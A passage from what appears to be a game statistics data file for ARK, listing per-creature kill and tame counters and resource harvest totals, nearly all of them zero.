    ""BlueOSD"": 0,
    ""YellowOSD"": 0,
    ""RedOSD"": 0,
    ""PurpleOSD"": 0,
    ""PurpleOSDWaves"": 0,
    ""ElementNodeEasy"": 0,
    ""ElementNodeMedium"": 0,
    ""ElementNodeHard"": 0,
    ""FishCaught"": 0,
    ""AberrantAchatina[Killed]"": 0,
    ""AberrantAnglerfish[Killed]"": 0,
    ""AberrantAnkylosaurus[Killed]"": 0,
    ""AberrantAraneo[Killed]"": 0,
    ""AberrantArthropluera[Killed]"": 0,
    ""AberrantBaryonyx[Killed]"": 0,
    ""AberrantBeelzebufo[Killed]"": 0,
    ""AberrantCarbonemys[Killed]"": 0,
    ""AberrantCarnotaurus[Killed]"": 0,
    ""AberrantCnidaria[Killed]"": 0,
    ""AberrantCoelacanth[Killed]"": 0,
    ""AberrantDimetrodon[Killed]"": 0,
    ""AberrantDimorphodon[Killed]"": 0,
    ""AberrantDiplocaulus[Killed]"": 0,
    ""AberrantDiplodocus[Killed]"": 0,
    ""AberrantDireBear[Killed]"": 0,
    ""AberrantDodo[Killed]"": 0,
    ""AberrantDoedicurus[Killed]"": 0,
    ""AberrantDungBeetle[Killed]"": 0,
    ""AberrantElectrophorus[Killed]"": 0,
    ""AberrantEquus[Killed]"": 0,
    ""AberrantGigantopithecus[Killed]"": 0,
    ""AberrantIguanodon[Killed]"": 0,
    ""AberrantLystrosaurus[Killed]"": 0,
    ""AberrantManta[Killed]"": 0,
    ""AberrantMegalania[Killed]"": 0,
    ""AberrantMegalosaurus[Killed]"": 0,
    ""AberrantMeganeura[Killed]"": 0,
    ""AberrantMoschops[Killed]"": 0,
    ""AberrantOtter[Killed]"": 0,
    ""AberrantOvis[Killed]"": 0,
    ""AberrantParaceratherium[Killed]"": 0,
    ""AberrantParasaur[Killed]"": 0,
    ""AberrantPiranha[Killed]"": 0,
    ""AberrantPulmonoscorpius[Killed]"": 0,
    ""AberrantPurlovia[Killed]"": 0,
    ""AberrantRaptor[Killed]"": 0,
    ""AberrantSabertoothSalmon[Killed]"": 0,
    ""AberrantSarco[Killed]"": 0,
    ""AberrantSpino[Killed]"": 0,
    ""AberrantStegosaurus[Killed]"": 0,
    ""AberrantTitanoboa[Killed]"": 0,
    ""AberrantTriceratops[Killed]"": 0,
    ""AberrantTrilobite[Killed]"": 0,
    ""Achatina[Killed]"": 0,
    ""Allosaurus[Killed]"": 0,
    ""AlphaBasiliskKills"": 0,
    ""AlphaBasilisk[Killed]"": 0,
    ""AlphaCarnoKills"": 0,
    ""AlphaCarno[Killed]"": 0,
    ""AlphaCorruptRexKills"": 0,
    ""AlphaCorruptRex[Killed]"": 0,
    ""AlphaCorruptTrikeKills"": 0,
    ""AlphaCorruptTrike[Killed]"": 0,
    ""AlphaCrystalWyvernKills"": 0,
    ""AlphaCrystalWyvern[Killed]"": 0,
    ""AlphaDeathWormKills"": 0,
    ""AlphaDeathWorm[Killed]"": 0,
    ""AlphaFireWyvernKills"": 0,
    ""AlphaFireWyvern[Killed]"": 0,
    ""AlphaKarkinosKills"": 0,
    ""AlphaKarkinos[Killed]"": 0,
    ""AlphaKills"": 0,
    ""AlphaLeedsichthysKills"": 0,
    ""AlphaLeedsichthys[Killed]"": 0,
    ""AlphaMegalodonKills"": 0,
    ""AlphaMegalodon[Killed]"": 0,
    ""AlphaMosasaurKills"": 0,
    ""AlphaMosasaur[Killed]"": 0,
    ""AlphaRaptorKills"": 0,
    ""AlphaRaptor[Killed]"": 0,
    ""AlphaReaperKills"": 0,
    ""AlphaReaper[Killed]"": 0,
    ""AlphaT-Rex[Killed]"": 0,
    ""AlphaTRexKills"": 0,
    ""AlphaTusoteuthisKills"": 0,
    ""AlphaTusoteuthis[Killed]"": 0,
    ""Ammonite[Killed]"": 0,
    ""Anglerfish[Killed]"": 0,
    ""Ankylosaurus[Killed]"": 0,
    ""Araneo[Killed]"": 0,
    ""Archaeopteryx[Killed]"": 0,
    ""Argentavis[Killed]"": 0,
    ""Arthropluera[Killed]"": 0,
    ""Astrocetus[Killed]"": 0,
    ""Astrodelphis[Killed]"": 0,
    ""Baryonyx[Killed]"": 0,
    ""BasiliskGhost[Killed]"": 0,
    ""Basilisk[Killed]"": 0,
    ""Basilosaurus[Killed]"": 0,
    ""Beelzebufo[Killed]"": 0,
    ""BloodCrystalWyvern[Killed]"": 0,
    ""Bloodstalker[Killed]"": 0,
    ""BoneFireWyvern[Killed]"": 0,
    ""Brontosaurus[Killed]"": 0,
    ""BulbdogGhost[Killed]"": 0,
    ""Bulbdog[Killed]"": 0,
    ""BunnyDodo[Killed]"": 0,
    ""BunnyOviraptor[Killed]"": 0,
    ""Carbonemys[Killed]"": 0,
    ""Carnotaurus[Killed]"": 0,
    ""Castoroides[Killed]"": 0,
    ""Chalicotherium[Killed]"": 0,
    ""ChalkGolem[Killed]"": 0,
    ""Cnidaria[Killed]"": 0,
    ""Coelacanth[Killed]"": 0,
    ""Compy[Killed]"": 0,
    ""Daeodon[Killed]"": 0,
    ""Deathworm[Killed]"": 0,
    ""DefenseUnit[Killed]"": 0,
    ""Deinonychus[Killed]"": 0,
    ""DesertTitanFlock[Killed]"": 0,
    ""DesertTitan[Killed]"": 0,
    ""Dilophosaur[Killed]"": 0,
    ""Dimetrodon[Killed]"": 0,
    ""Dimorphodon[Killed]"": 0,
    ""Diplocaulus[Killed]"": 0,
    ""Diplodocus[Killed]"": 0,
    ""Dire Bear[Killed]"": 0,
    ""DirewolfGhost[Killed]"": 0,
    ""Direwolf[Killed]"": 0,
    ""DiseasedLeech[Killed]"": 0,
    ""DodoRex[Killed]"": 0,
    ""DodoWyvern[Killed]"": 0,
    ""Dodo[Killed]"": 0,
    ""Doedicurus[Killed]"": 0,
    ""DungBeetle[Killed]"": 0,
    ""Dunkleosteus[Killed]"": 0,
    ""Electrophorus[Killed]"": 0,
    ""EmberCrystalWyvern[Killed]"": 0,
    ""Enforcer[Killed]"": 0,
    ""EnragedCorruptedRex[Killed]"": 0,
    ""Equus[Killed]"": 0,
    ""Eurypterid[Killed]"": 0,
    ""Exo-Mek[Killed]"": 0,
    ""Featherlight[Killed]"": 0,
    ""Ferox Large[Killed]"": 0,
    ""Ferox Small[Killed]"": 0,
    ""FireWyvern[Killed]"": 0,
    ""FlyTitanomyrma[Killed]"": 0,
    ""ForestTitan[Killed]"": 0,
    ""ForestWyvern[Killed]"": 0,
    ""GachaClaus[Killed]"": 0,
    ""Gacha[Killed]"": 0,
    ""Gallimimus[Killed]"": 0,
    ""Gasbags[Killed]"": 0,
    ""GiantBee[Killed]"": 0,
    ""GiantWorkerBee[Killed]"": 0,
    ""Giganotosaurus[Killed]"": 0,
    ""Gigantopithecus[Killed]"": 0,
    ""Glowbug[Killed]"": 0,
    ""Glowtail[Killed]"": 0,
    ""Griffin[Killed]"": 0,
    ""Hesperornis[Killed]"": 0,
    ""Hyaenodon[Killed]"": 0,
    ""IceGolem[Killed]"": 0,
    ""IceTitan[Killed]"": 0,
    ""IceWyvern[Killed]"": 0,
    ""Ichthyornis[Killed]"": 0,
    ""Ichthyosaurus[Killed]"": 0,
    ""Iguanodon[Killed]"": 0,
    ""Jerboa[Killed]"": 0,
    ""JugBug[Killed]"": 0,
    ""Kairuku[Killed]"": 0,
    ""Kaprosuchus[Killed]"": 0,
    ""Karkinos[Killed]"": 0,
    ""Kentrosaurus[Killed]"": 0,
    ""Lamprey[Killed]"": 0,
    ""Leech[Killed]"": 0,
    ""Leedsichthys[Killed]"": 0,
    ""LightningWyvern[Killed]"": 0,
    ""Liopleurodon[Killed]"": 0,
    ""Lymantria[Killed]"": 0,
    ""Lystrosaurus[Killed]"": 0,
    ""Macrophage[Killed]"": 0,
    ""Maewing[Killed]"": 0,
    ""Magmasaur[Killed]"": 0,
    ""Mammoth[Killed]"": 0,
    ""Managarmr[Killed]"": 0,
    ""Manta[Killed]"": 0,
    ""MantisGhost[Killed]"": 0,
    ""Mantis[Killed]"": 0,
    ""MegaMek[Killed]"": 0,
    ""Megachelon[Killed]"": 0,
    ""Megalania[Killed]"": 0,
    ""Megaloceros[Killed]"": 0,
    ""Megalodon[Killed]"": 0,
    ""Megalosaurus[Killed]"": 0,
    ""Meganeura[Killed]"": 0,
    ""Megapithecus[Killed]"": 0,
    ""Megatherium[Killed]"": 0,
    ""Mek[Killed]"": 0,
    ""Mesopithecus[Killed]"": 0,
    ""Microraptor[Killed]"": 0,
    ""Morellatops[Killed]"": 0,
    ""Mosasaurus[Killed]"": 0,
    ""Moschops[Killed]"": 0,
    ""Nameless[Killed]"": 0,
    ""Noglin[Killed]"": 0,
    ""OilJugBug[Killed]"": 0,
    ""Onychonycteris[Killed]"": 0,
    ""Otter[Killed]"": 0,
    ""Oviraptor[Killed]"": 0,
    ""Ovis[Killed]"": 0,
    ""Pachy[Killed]"": 0,
    ""Pachyrhinosaurus[Killed]"": 0,
    ""Paraceratherium[Killed]"": 0,
    ""Parasaurolophus[Killed]"": 0,
    ""Pegomastax[Killed]"": 0,
    ""Pelagornis[Killed]"": 0,
    ""Phiomia[Killed]"": 0,
    ""Phoenix[Killed]"": 0,
    ""Piranha[Killed]"": 0,
    ""Plesiosaur[Killed]"": 0,
    ""PoisonWyvern[Killed]"": 0,
    ""Procoptodon[Killed]"": 0,
    ""Pteranodon[Killed]"": 0,
    ""Pulmonoscorpius[Killed]"": 0,
    ""Purlovia[Killed]"": 0,
    ""Quetzalcoatlus[Killed]"": 0,
    ""R-Allosaurus[Killed]"": 0,
    ""R-Brontosaurus[Killed]"": 0,
    ""R-Carbonemys[Killed]"": 0,
    ""R-Carnotaurus[Killed]"": 0,
    ""R-Daeodon[Killed]"": 0,
    ""R-Dilophosaur[Killed]"": 0,
    ""R-DireBear[Killed]"": 0,
    ""R-Direwolf[Killed]"": 0,
    ""R-Equus[Killed]"": 0,
    ""R-Gasbags[Killed]"": 0,
    ""R-Giganotosaurus[Killed]"": 0,
    ""R-Megatherium[Killed]"": 0,
    ""R-Parasaur[Killed]"": 0,
    ""R-Procoptodon[Killed]"": 0,
    ""R-Quetzal[Killed]"": 0,
    ""R-ReaperKing[Killed]"": 0,
    ""R-ReaperQueen[Killed]"": 0,
    ""R-SnowOwl[Killed]"": 0,
    ""R-Thylacoleo[Killed]"": 0,
    ""R-Velonasaur[Killed]"": 0,
    ""Raptor[Killed]"": 0,
    ""Ravager[Killed]"": 0,
    ""ReaperKing[Killed]"": 0,
    ""ReaperPrince[Killed]"": 0,
    ""RexGhost[Killed]"": 0,
    ""Rex[Killed]"": 0,
    ""RockDrake[Killed]"": 0,
    ""RockElemental[Killed]"": 0,
    ""Rockwell(Alpha)[Killed]"": 0,
    ""Rockwell(Beta)[Killed]"": 0,
    ""Rockwell(Gamma)[Killed]"": 0,
    ""Rockwell[Killed]"": 0,
    ""RollRat[Killed]"": 0,
    ""RubbleGolem[Killed]"": 0,
    ""SabertoothSalmon[Killed]"": 0,
    ""Sabertooth[Killed]"": 0,
    ""Sarco[Killed]"": 0,
    ""Scout[Killed]"": 0,
    ""Seeker[Killed]"": 0,
    ""Shadowmane[Killed]"": 0,
    ""Shinehorn[Killed]"": 0,
    ""SkeletalBronto[Killed]"": 0,
    ""SkeletalCarnotaurus[Killed]"": 0,
    ""SkeletalGiganotosaurus[Killed]"": 0,
    ""SkeletalJerboa[Killed]"": 0,
    ""SkeletalQuetzal[Killed]"": 0,
    ""SkeletalRaptor[Killed]"": 0,
    ""SkeletalRex[Killed]"": 0,
    ""SkeletalStego[Killed]"": 0,
    ""SkeletalTrike[Killed]"": 0,
    ""SnowOwlGhost[Killed]"": 0,
    ""SnowOwl[Killed]"": 0,
    ""Spino[Killed]"": 0,
    ""Stegosaurus[Killed]"": 0,
    ""Summoner[Killed]"": 0,
    ""SuperTurkey[Killed]"": 0,
    ""SurfaceReaperKingGhost[Killed]"": 0,
    ""Tapejara[Killed]"": 0,
    ""TekGiganotosaurus[Killed]"": 0,
    ""TekKills"": 0,
    ""TekParasaur[Killed]"": 0,
    ""TekQuetzal[Killed]"": 0,
    ""TekRaptor[Killed]"": 0,
    ""TekRex[Killed]"": 0,
    ""TekStegosaurus[Killed]"": 0,
    ""TekStryder[Killed]"": 0,
    ""TekTriceratops[Killed]"": 0,
    ""TerrorBird[Killed]"": 0,
    ""Therizinosaur[Killed]"": 0,
    ""ThornyDragon[Killed]"": 0,
    ""Thylacoleo[Killed]"": 0,
    ""Titanoboa[Killed]"": 0,
    ""Titanomyrma[Killed]"": 0,
    ""Titanosaur[Killed]"": 0,
    ""Triceratops[Killed]"": 0,
    ""Trilobite[Killed]"": 0,
    ""Troodon[Killed]"": 0,
    ""Tropeognathus[Killed]"": 0,
    ""TropicalCrystalWyvern[Killed]"": 0,
    ""Turkey[Killed]"": 0,
    ""Tusoteuthis[Killed]"": 0,
    ""Unicorn[Killed]"": 0,
    ""Velonasaur[Killed]"": 0,
    ""Voidwyrm[Killed]"": 0,
    ""Vulture[Killed]"": 0,
    ""WaterJugBug[Killed]"": 0,
    ""WoollyRhino[Killed]"": 0,
    ""Wyvern[Killed]"": 0,
    ""X-Allosaurus[Killed]"": 0,
    ""X-Ankylosaurus[Killed]"": 0,
    ""X-Argentavis[Killed]"": 0,
    ""X-Basilosaurus[Killed]"": 0,
    ""X-Dunkleosteus[Killed]"": 0,
    ""X-Ichthyosaurus[Killed]"": 0,
    ""X-Megalodon[Killed]"": 0,
    ""X-Mosasaurus[Killed]"": 0,
    ""X-Otter[Killed]"": 0,
    ""X-Paraceratherium[Killed]"": 0,
    ""X-Parasaur[Killed]"": 0,
    ""X-Raptor[Killed]"": 0,
    ""X-Rex[Killed]"": 0,
    ""X-RockElemental[Killed]"": 0,
    ""X-SabertoothSalmon[Killed]"": 0,
    ""X-Sabertooth[Killed]"": 0,
    ""X-Spino[Killed]"": 0,
    ""X-Tapejara[Killed]"": 0,
    ""X-Triceratops[Killed]"": 0,
    ""X-WoollyRhino[Killed]"": 0,
    ""X-Yutyrannus[Killed]"": 0,
    ""Yeti[Killed]"": 0,
    ""Yutyrannus[Killed]"": 0,
    ""ZombieFireWyvern[Killed]"": 0,
    ""ZombieLightningWyvern[Killed]"": 0,
    ""ZombiePoisonWyvern[Killed]"": 0,
    ""Zomdodo[Killed]"": 0,
    ""AberrantAchatina[Tamed]"": 0,
    ""AberrantAnglerfish[Tamed]"": 0,
    ""AberrantAnkylosaurus[Tamed]"": 0,
    ""AberrantAraneo[Tamed]"": 0,
    ""AberrantArthropluera[Tamed]"": 0,
    ""AberrantBaryonyx[Tamed]"": 0,
    ""AberrantBeelzebufo[Tamed]"": 0,
    ""AberrantCarbonemys[Tamed]"": 0,
    ""AberrantCarnotaurus[Tamed]"": 0,
    ""AberrantCnidaria[Tamed]"": 0,
    ""AberrantCoelacanth[Tamed]"": 0,
    ""AberrantDimetrodon[Tamed]"": 0,
    ""AberrantDimorphodon[Tamed]"": 0,
    ""AberrantDiplocaulus[Tamed]"": 0,
    ""AberrantDiplodocus[Tamed]"": 0,
    ""AberrantDireBear[Tamed]"": 0,
    ""AberrantDodo[Tamed]"": 0,
    ""AberrantDoedicurus[Tamed]"": 0,
    ""AberrantDungBeetle[Tamed]"": 0,
    ""AberrantElectrophorus[Tamed]"": 0,
    ""AberrantEquus[Tamed]"": 0,
    ""AberrantGigantopithecus[Tamed]"": 0,
    ""AberrantIguanodon[Tamed]"": 0,
    ""AberrantLystrosaurus[Tamed]"": 0,
    ""AberrantManta[Tamed]"": 0,
    ""AberrantMegalania[Tamed]"": 0,
    ""AberrantMegalosaurus[Tamed]"": 0,
    ""AberrantMeganeura[Tamed]"": 0,
    ""AberrantMoschops[Tamed]"": 0,
    ""AberrantOtter[Tamed]"": 0,
    ""AberrantOvis[Tamed]"": 0,
    ""AberrantParaceratherium[Tamed]"": 0,
    ""AberrantParasaur[Tamed]"": 0,
    ""AberrantPiranha[Tamed]"": 0,
    ""AberrantPulmonoscorpius[Tamed]"": 0,
    ""AberrantPurlovia[Tamed]"": 0,
    ""AberrantRaptor[Tamed]"": 0,
    ""AberrantSabertoothSalmon[Tamed]"": 0,
    ""AberrantSarco[Tamed]"": 0,
    ""AberrantSpino[Tamed]"": 0,
    ""AberrantStegosaurus[Tamed]"": 0,
    ""AberrantTitanoboa[Tamed]"": 0,
    ""AberrantTriceratops[Tamed]"": 0,
    ""AberrantTrilobite[Tamed]"": 0,
    ""Achatina[Tamed]"": 0,
    ""Allosaurus[Tamed]"": 0,
    ""AlphaCarno[Tamed]"": 0,
    ""AlphaLeedsichthys[Tamed]"": 0,
    ""AlphaMegalodon[Tamed]"": 0,
    ""AlphaMosasaur[Tamed]"": 0,
    ""AlphaRaptor[Tamed]"": 0,
    ""AlphaT-Rex[Tamed]"": 0,
    ""AlphaTusoteuthis[Tamed]"": 0,
    ""Ammonite[Tamed]"": 0,
    ""Anglerfish[Tamed]"": 0,
    ""Ankylosaurus[Tamed]"": 0,
    ""Araneo[Tamed]"": 0,
    ""Archaeopteryx[Tamed]"": 0,
    ""Argentavis[Tamed]"": 0,
    ""Arthropluera[Tamed]"": 0,
    ""Astrocetus[Tamed]"": 0,
    ""Astrodelphis[Tamed]"": 0,
    ""Baryonyx[Tamed]"": 0,
    ""BasiliskGhost[Tamed]"": 0,
    ""Basilisk[Tamed]"": 0,
    ""Basilosaurus[Tamed]"": 0,
    ""Beelzebufo[Tamed]"": 0,
    ""BloodCrystalWyvern[Tamed]"": 0,
    ""Bloodstalker[Tamed]"": 0,
    ""BoneFireWyvern[Tamed]"": 0,
    ""Brontosaurus[Tamed]"": 0,
    ""BulbdogGhost[Tamed]"": 0,
    ""Bulbdog[Tamed]"": 0,
    ""BunnyDodo[Tamed]"": 0,
    ""BunnyOviraptor[Tamed]"": 0,
    ""Carbonemys[Tamed]"": 0,
    ""Carnotaurus[Tamed]"": 0,
    ""Castoroides[Tamed]"": 0,
    ""Chalicotherium[Tamed]"": 0,
    ""ChalkGolem[Tamed]"": 0,
    ""Cnidaria[Tamed]"": 0,
    ""Coelacanth[Tamed]"": 0,
    ""Compy[Tamed]"": 0,
    ""Daeodon[Tamed]"": 0,
    ""Deathworm[Tamed]"": 0,
    ""DefenseUnit[Tamed]"": 0,
    ""Deinonychus[Tamed]"": 0,
    ""DesertTitanFlock[Tamed]"": 0,
    ""DesertTitan[Tamed]"": 0,
    ""Dilophosaur[Tamed]"": 0,
    ""Dimetrodon[Tamed]"": 0,
    ""Dimorphodon[Tamed]"": 0,
    ""Diplocaulus[Tamed]"": 0,
    ""Diplodocus[Tamed]"": 0,
    ""Dire Bear[Tamed]"": 0,
    ""DirewolfGhost[Tamed]"": 0,
    ""Direwolf[Tamed]"": 0,
    ""DiseasedLeech[Tamed]"": 0,
    ""DodoRex[Tamed]"": 0,
    ""DodoWyvern[Tamed]"": 0,
    ""Dodo[Tamed]"": 0,
    ""Doedicurus[Tamed]"": 0,
    ""DungBeetle[Tamed]"": 0,
    ""Dunkleosteus[Tamed]"": 0,
    ""Electrophorus[Tamed]"": 0,
    ""EmberCrystalWyvern[Tamed]"": 0,
    ""Enforcer[Tamed]"": 0,
    ""EnragedCorruptedRex[Tamed]"": 0,
    ""Equus[Tamed]"": 0,
    ""Eurypterid[Tamed]"": 0,
    ""Exo-Mek[Tamed]"": 0,
    ""Featherlight[Tamed]"": 0,
    ""Ferox Large[Tamed]"": 0,
    ""Ferox Small[Tamed]"": 0,
    ""FireWyvern[Tamed]"": 0,
    ""FlyTitanomyrma[Tamed]"": 0,
    ""ForestTitan[Tamed]"": 0,
    ""ForestWyvern[Tamed]"": 0,
    ""GachaClaus[Tamed]"": 0,
    ""Gacha[Tamed]"": 0,
    ""Gallimimus[Tamed]"": 0,
    ""Gasbags[Tamed]"": 0,
    ""GiantBee[Tamed]"": 0,
    ""GiantWorkerBee[Tamed]"": 0,
    ""Giganotosaurus[Tamed]"": 0,
    ""Gigantopithecus[Tamed]"": 0,
    ""Glowbug[Tamed]"": 0,
    ""Glowtail[Tamed]"": 0,
    ""Griffin[Tamed]"": 0,
    ""Hesperornis[Tamed]"": 0,
    ""Hyaenodon[Tamed]"": 0,
    ""IceGolem[Tamed]"": 0,
    ""IceTitan[Tamed]"": 0,
    ""IceWyvern[Tamed]"": 0,
    ""Ichthyornis[Tamed]"": 0,
    ""Ichthyosaurus[Tamed]"": 0,
    ""Iguanodon[Tamed]"": 0,
    ""Jerboa[Tamed]"": 0,
    ""JugBug[Tamed]"": 0,
    ""Kairuku[Tamed]"": 0,
    ""Kaprosuchus[Tamed]"": 0,
    ""Karkinos[Tamed]"": 0,
    ""Kentrosaurus[Tamed]"": 0,
    ""Lamprey[Tamed]"": 0,
    ""Leech[Tamed]"": 0,
    ""Leedsichthys[Tamed]"": 0,
    ""LightningWyvern[Tamed]"": 0,
    ""Liopleurodon[Tamed]"": 0,
    ""Lymantria[Tamed]"": 0,
    ""Lystrosaurus[Tamed]"": 0,
    ""Macrophage[Tamed]"": 0,
    ""Maewing[Tamed]"": 0,
    ""Magmasaur[Tamed]"": 0,
    ""Mammoth[Tamed]"": 0,
    ""Managarmr[Tamed]"": 0,
    ""Manta[Tamed]"": 0,
    ""MantisGhost[Tamed]"": 0,
    ""Mantis[Tamed]"": 0,
    ""MegaMek[Tamed]"": 0,
    ""Megachelon[Tamed]"": 0,
    ""Megalania[Tamed]"": 0,
    ""Megaloceros[Tamed]"": 0,
    ""Megalodon[Tamed]"": 0,
    ""Megalosaurus[Tamed]"": 0,
    ""Meganeura[Tamed]"": 0,
    ""Megapithecus[Tamed]"": 0,
    ""Megatherium[Tamed]"": 0,
    ""Mek[Tamed]"": 0,
    ""Mesopithecus[Tamed]"": 0,
    ""Microraptor[Tamed]"": 0,
    ""Morellatops[Tamed]"": 0,
    ""Mosasaurus[Tamed]"": 0,
    ""Moschops[Tamed]"": 0,
    ""Nameless[Tamed]"": 0,
    ""Noglin[Tamed]"": 0,
    ""OilJugBug[Tamed]"": 0,
    ""Onychonycteris[Tamed]"": 0,
    ""Otter[Tamed]"": 0,
    ""Oviraptor[Tamed]"": 0,
    ""Ovis[Tamed]"": 0,
    ""Pachy[Tamed]"": 0,
    ""Pachyrhinosaurus[Tamed]"": 0,
    ""Paraceratherium[Tamed]"": 0,
    ""Parasaurolophus[Tamed]"": 0,
    ""Pegomastax[Tamed]"": 0,
    ""Pelagornis[Tamed]"": 0,
    ""Phiomia[Tamed]"": 0,
    ""Phoenix[Tamed]"": 0,
    ""Piranha[Tamed]"": 0,
    ""Plesiosaur[Tamed]"": 0,
    ""PoisonWyvern[Tamed]"": 0,
    ""Procoptodon[Tamed]"": 0,
    ""Pteranodon[Tamed]"": 0,
    ""Pulmonoscorpius[Tamed]"": 0,
    ""Purlovia[Tamed]"": 0,
    ""Quetzalcoatlus[Tamed]"": 0,
    ""R-Allosaurus[Tamed]"": 0,
    ""R-Brontosaurus[Tamed]"": 0,
    ""R-Carbonemys[Tamed]"": 0,
    ""R-Carnotaurus[Tamed]"": 0,
    ""R-Daeodon[Tamed]"": 0,
    ""R-Dilophosaur[Tamed]"": 0,
    ""R-DireBear[Tamed]"": 0,
    ""R-Direwolf[Tamed]"": 0,
    ""R-Equus[Tamed]"": 0,
    ""R-Gasbags[Tamed]"": 0,
    ""R-Giganotosaurus[Tamed]"": 0,
    ""R-Megatherium[Tamed]"": 0,
    ""R-Parasaur[Tamed]"": 0,
    ""R-Procoptodon[Tamed]"": 0,
    ""R-Quetzal[Tamed]"": 0,
    ""R-ReaperKing[Tamed]"": 0,
    ""R-ReaperQueen[Tamed]"": 0,
    ""R-SnowOwl[Tamed]"": 0,
    ""R-Thylacoleo[Tamed]"": 0,
    ""R-Velonasaur[Tamed]"": 0,
    ""Raptor[Tamed]"": 0,
    ""Ravager[Tamed]"": 0,
    ""ReaperKing[Tamed]"": 0,
    ""ReaperPrince[Tamed]"": 0,
    ""RexGhost[Tamed]"": 0,
    ""Rex[Tamed]"": 0,
    ""RockDrake[Tamed]"": 0,
    ""RockElemental[Tamed]"": 0,
    ""RollRat[Tamed]"": 0,
    ""RubbleGolem[Tamed]"": 0,
    ""SabertoothSalmon[Tamed]"": 0,
    ""Sabertooth[Tamed]"": 0,
    ""Sarco[Tamed]"": 0,
    ""Scout[Tamed]"": 0,
    ""Seeker[Tamed]"": 0,
    ""Shadowmane[Tamed]"": 0,
    ""Shinehorn[Tamed]"": 0,
    ""SkeletalBronto[Tamed]"": 0,
    ""SkeletalCarnotaurus[Tamed]"": 0,
    ""SkeletalGiganotosaurus[Tamed]"": 0,
    ""SkeletalJerboa[Tamed]"": 0,
    ""SkeletalQuetzal[Tamed]"": 0,
    ""SkeletalRaptor[Tamed]"": 0,
    ""SkeletalRex[Tamed]"": 0,
    ""SkeletalStego[Tamed]"": 0,
    ""SkeletalTrike[Tamed]"": 0,
    ""SnowOwlGhost[Tamed]"": 0,
    ""SnowOwl[Tamed]"": 0,
    ""Spino[Tamed]"": 0,
    ""Stegosaurus[Tamed]"": 0,
    ""Summoner[Tamed]"": 0,
    ""SuperTurkey[Tamed]"": 0,
    ""SurfaceReaperKingGhost[Tamed]"": 0,
    ""Tapejara[Tamed]"": 0,
    ""TekGiganotosaurus[Tamed]"": 0,
    ""TekParasaur[Tamed]"": 0,
    ""TekQuetzal[Tamed]"": 0,
    ""TekRaptor[Tamed]"": 0,
    ""TekRex[Tamed]"": 0,
    ""TekStegosaurus[Tamed]"": 0,
    ""TekStryder[Tamed]"": 0,
    ""TekTriceratops[Tamed]"": 0,
    ""TerrorBird[Tamed]"": 0,
    ""Therizinosaur[Tamed]"": 0,
    ""ThornyDragon[Tamed]"": 0,
    ""Thylacoleo[Tamed]"": 0,
    ""Titanoboa[Tamed]"": 0,
    ""Titanomyrma[Tamed]"": 0,
    ""Titanosaur[Tamed]"": 0,
    ""Triceratops[Tamed]"": 0,
    ""Trilobite[Tamed]"": 0,
    ""Troodon[Tamed]"": 0,
    ""Tropeognathus[Tamed]"": 0,
    ""TropicalCrystalWyvern[Tamed]"": 0,
    ""Turkey[Tamed]"": 0,
    ""Tusoteuthis[Tamed]"": 0,
    ""Unicorn[Tamed]"": 0,
    ""Velonasaur[Tamed]"": 0,
    ""Voidwyrm[Tamed]"": 0,
    ""Vulture[Tamed]"": 0,
    ""WaterJugBug[Tamed]"": 0,
    ""WoollyRhino[Tamed]"": 0,
    ""Wyvern[Tamed]"": 0,
    ""X-Allosaurus[Tamed]"": 0,
    ""X-Ankylosaurus[Tamed]"": 0,
    ""X-Argentavis[Tamed]"": 0,
    ""X-Basilosaurus[Tamed]"": 0,
    ""X-Dunkleosteus[Tamed]"": 0,
    ""X-Ichthyosaurus[Tamed]"": 0,
    ""X-Megalodon[Tamed]"": 0,
    ""X-Mosasaurus[Tamed]"": 0,
    ""X-Otter[Tamed]"": 0,
    ""X-Paraceratherium[Tamed]"": 0,
    ""X-Parasaur[Tamed]"": 0,
    ""X-Raptor[Tamed]"": 0,
    ""X-Rex[Tamed]"": 0,
    ""X-RockElemental[Tamed]"": 0,
    ""X-SabertoothSalmon[Tamed]"": 0,
    ""X-Sabertooth[Tamed]"": 0,
    ""X-Spino[Tamed]"": 0,
    ""X-Tapejara[Tamed]"": 0,
    ""X-Triceratops[Tamed]"": 0,
    ""X-WoollyRhino[Tamed]"": 0,
    ""X-Yutyrannus[Tamed]"": 0,
    ""Yeti[Tamed]"": 0,
    ""Yutyrannus[Tamed]"": 0,
    ""ZombieFireWyvern[Tamed]"": 0,
    ""ZombieLightningWyvern[Tamed]"": 0,
    ""ZombiePoisonWyvern[Tamed]"": 0,
    ""Zomdodo[Tamed]"": 0,
    ""AbsorbentSubstrateharvest"": 0,
    ""AchatinaPasteharvest"": 0,
    ""Ambergrisharvest"": 0,
    ""AmmoniteBileharvest"": 0,
    ""AnglerGelharvest"": 0,
    ""BlackPearlharvest"": 0,
    ""BloodPackharvest"": 0,
    ""BlueCrystalizedSapharvest"": 0,
    ""BlueGemharvest"": 0,
    ""CementingPasteharvest"": 0,
    ""Charcoalharvest"": 0,
    ""ChargeBatteryharvest"": 0,
    ""Chitinharvest"": 36,
    ""ChitinorKeratinharvest"": 0,
    ""Clayharvest"": 0,
    ""CondensedGasharvest"": 0,
    ""CongealedGasBallharvest"": 0,
    ""CorruptedNoduleharvest"": 0,
    ""CorruptedWoodharvest"": 0,
    ""CraftedElementDustharvest"": 0,
    ""Crystalharvest"": 0,
    ""DeathwormHornharvest"": 0,
    ""Dermisharvest"": 0,
    ""DinosaurBoneharvest"": 0,
    ""Electronicsharvest"": 0,
    ""ElementDustharvest"": 0,
    ""ElementOreharvest"": 0,
    ""ElementShardharvest"": 0,
    ""Elementharvest"": 0,
    ""Fertilizerharvest"": 0,
    ""Fiberharvest"": 328,
    ""Flintharvest"": 0,
    ""FragmentedGreenGemharvest"": 0,
    ""FungalWoodharvest"": 0,
    ""Gasolineharvest"": 0,
    ""GoldenNuggetharvest"": 0,
    ""GreenGemharvest"": 0,
    ""Gunpowderharvest"": 0,
    ""Hideharvest"": 60,
    ""HighQualityPollenharvest"": 0,
    ""HumanHairharvest"": 0,
    ""Keratinharvest"": 0,
    ""LeechBloodharvest"": 0,
    ""LeechBloodorHornsharvest"": 0,
    ""MetalIngotharvest"": 0,
    ""Metalharvest"": 0,
    ""Mutagelharvest"": 0,
    ""Mutagenharvest"": 0,
    ""Narcoticharvest"": 0,
    ""Obsidianharvest"": 0,
    ""OilTusoteuthisharvest"": 0,
    ""Oilharvest"": 0,
    ""OrganicPolymerharvest"": 0,
    ""Pelt,Hair,orWoolharvest"": 0,
    ""Peltharvest"": 0,
    ""Polymerharvest"": 0,
    ""PreservingSaltharvest"": 0,
    ""PrimalCrystalharvest"": 0,
    ""Propellantharvest"": 0,
